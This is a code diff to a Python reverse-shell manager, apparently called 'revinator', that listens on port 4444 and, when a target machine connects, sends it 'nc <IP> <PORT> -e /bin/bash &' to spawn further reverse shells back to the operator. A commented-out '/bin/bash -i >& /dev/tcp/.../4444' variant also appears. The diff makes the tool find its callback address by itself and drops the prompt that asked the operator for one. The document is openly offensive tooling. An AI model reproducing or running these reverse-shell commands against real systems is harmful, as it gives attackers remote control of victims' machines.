@@ -7,7 +7,7 @@ import os
 import pdb
 import time
 
-IP = "172.17.0.1"
+IP = ""
 PORT = 4444
 s = None
 
@@ -24,8 +24,9 @@ class connection:
 
     def create_new(self):
         global PORT, IP
-        self.conn.send(f"nc {IP} {PORT} -e /bin/bash & \n".encode())
-        #self.conn.send(b"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &\n")
+        print(f"nc {IP} {PORT} -e /bin/bash & \r")
+        self.conn.send(f"nc {IP} {PORT} -e /bin/bash & \r".encode())
+        #self.conn.send(b"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 &\r")
 
     def connect(self, sock):
         self.sock = sock[0]
@@ -86,7 +87,7 @@ def run_t(ip):
 
 
 def run(quiet_mode=False):
-    global s
+    global s, IP
     connections = []
     managed_connections = []
     addresses = {}
@@ -97,7 +98,7 @@ def run(quiet_mode=False):
 
     HOST = ''
     global PORT
-    print(f"\n\nserving on {IP}:{PORT}")
+    print(f"\n\nserving on port {PORT}")
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -121,6 +122,9 @@ def run(quiet_mode=False):
                 waitingl.append([ip, connections[-1]])
 
             else:                                       # connection from target machine
+                #pdb.set_trace()
+                if IP == "":
+                    IP = connections[-1][0].getsockname()[0]
                 managed_connections.append(connection(connections[-1]))
                 
                 latest = connections[-1][1][0]
@@ -171,13 +175,6 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     IP = args.ip
-    if IP == "CHANGE ME":
-        os.system("ip a")
-        print("\n\nYou have not configured an IP address to receive shells on. ", end="")
-        print("This can be changed by editing the revinator file (line 10), or using the -i option")
-        print("For now, you may continue by providing the IP")
-        IP = input("\n\nEnter the IP address:")
-
     PORT = args.port
 
     if args.listen:
